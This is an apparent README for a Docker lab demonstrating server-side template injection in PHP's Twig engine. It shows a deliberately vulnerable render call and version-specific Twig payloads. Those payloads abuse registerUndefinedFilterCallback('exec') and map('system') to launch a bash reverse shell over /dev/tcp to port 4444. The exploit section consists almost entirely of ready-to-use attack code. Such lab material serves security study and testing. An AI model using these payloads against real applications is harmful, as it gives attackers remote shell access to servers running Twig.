# PHP Twig

## Installation

```sh
$ docker run --rm -it ovotreeovo/php-twig
# php /var/www/html/1.php "{{ <payload-here> }}"
```

## Vulnerable Source

### current Twig version: v1.44.1
```php
require_once '/path/to/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello <code-here>!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index');
```

### Switch to other version:

```bash
# php /var/www/html/composer.phar require "twig/twig:^2.0"
```

## Exploit

### <= 1.19

```php
_self.env.registerUndefinedFilterCallback('exec')
_self.env.getFilter('/bin/bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"')
```


### >= 1.41, >= 2.10, 3.X

```php
['/bin/bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"']|map('system')|join(',')
```

## Reference

- https://xz.aliyun.com/t/7518
- https://twig.symfony.com/doc/3.x/intro.html#installation

